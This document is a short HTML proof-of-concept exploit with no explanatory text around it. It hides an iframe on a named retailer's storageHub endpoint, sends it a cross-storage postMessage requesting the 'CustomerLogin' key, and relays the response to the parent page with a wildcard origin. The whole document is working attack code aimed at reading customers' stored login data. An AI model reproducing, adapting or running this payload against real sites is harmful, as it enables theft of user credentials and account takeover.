<!DOCTYPE html>
<html>
  <body>
    <script>
      // Step 1: Create a new iframe pointing to vulnerable storageHub
      const victim = document.createElement("iframe");
      victim.src = "https://newegg.com/api/storageHub"; // Replace with actual vulnerable iframe URL
      victim.style.display = "none";

      // Step 2: Append it to this sandboxed iframe
      document.body.appendChild(victim);

      // Step 3: Wait a bit and send a postMessage
      setTimeout(() => {
        const payload = JSON.stringify({
          id: "999",
          action: "cross-storage:get",
          params: { key: "CustomerLogin" }
        });

        victim.contentWindow.postMessage(payload, "*");
        console.log("Sent payload to victim iframe");

        // Step 4: Listen for response from storageHub
        window.addEventListener("message", (event) => {
          console.log("Sandboxed iframe received response from victim:", event.origin, event.data);

          // Optionally forward response to main parent page
          window.parent.postMessage("Victim said: " + event.data, "*");
        });

      }, 10000);
    </script>
  </body>
</html>










